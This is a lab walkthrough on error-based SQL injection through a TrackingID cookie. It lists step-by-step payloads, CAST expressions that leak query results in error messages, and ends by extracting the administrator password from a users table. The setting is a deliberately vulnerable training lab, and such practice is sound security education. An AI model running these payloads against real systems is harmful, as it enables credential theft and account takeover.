
# Lab: Visible error-based SQL injection


## Lab Information

 This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account. 

## Steps to Reproduce


### Checking Parameter Vulnerability

- Inserting the `'` quote beside the `TrackingID` gives us the below response, indicating the `TrackingID` is vulnerable to SQLi.

![Image1](./Images/img1.png)

- Now injecting with the `'--` payload removes the error.


### Testing Error Entries

- Inserting the below payload produces the error as mentioned in the image.

```sql
' AND CAST((SELECT 1) AS int)--
```

![Image2](./Images/img2.png)

- Now after fixing the Boolean expression using the below payload, the application produces no errors.

```sql
' AND 1=CAST((SELECT 1)AS int)--
```

### Checking Users

- Sending us the below payload gives us an error and if you check the error carefully our query got truncated.

```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```


![Image3](./Images/img3.png)

- So delete the `TrackingID` portion in the BurpSuite query and then send the below payload but this time no `TrackingID`.

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

![Image4](./Images/img4.png)

- This proves we have an `administrator` user in the `users` table of the database.

### Finding Password

- The below payload helps us get the `administrator` password.

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![Solved](./Images/img5.png)

